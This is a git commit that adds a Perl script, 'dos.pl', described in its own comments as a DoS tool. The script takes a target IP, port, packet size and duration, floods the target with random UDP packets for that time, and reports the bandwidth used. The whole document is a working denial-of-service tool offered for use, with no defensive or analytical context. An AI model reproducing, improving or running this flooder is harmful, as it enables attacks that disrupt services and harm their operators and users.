bf1f53042233a27ab7cc07c6f6d96fd1ea7dabe3
Ging3r Carr0t <MrJemil@outlook.com>
2017-03-18 04:59:11 +0000

    Create dos.pl

---
+++ dos.pl
@@ -0,0 +1,36 @@
+#!/usr/bin/perl
+
+##
+# Perl DoS by Mefus & Ging3r Carr0t
+# RIP Mefus <3
+# Usage <ip> <port> <packet size> <time>
+##
+
+use Socket;
+use strict;
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$count);
+
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip. \n";
+
+$endtime = time() + $time;
+
+socket(sckt, PF_INET, SOCK_DGRAM, 17);
+
+print "Flooding $ip on port $port, with $size bytes for $time seconds. \n";
+
+my @chars = ("A".."Z", "a".."z");
+my $string;
+$string .= $chars[rand @chars] for 1..$size;
+
+$count = 0;
+
+for (;time() <= $endtime; $count++) {
+  send(sckt, $string, 0, pack_sockaddr_in($port, $iaddr));
+  }
+
+print "Flood Completed, ";
+printf("%.2f", ((($count/$time)*($size*8))/1024/1024));
+print " Mb/s. \n";
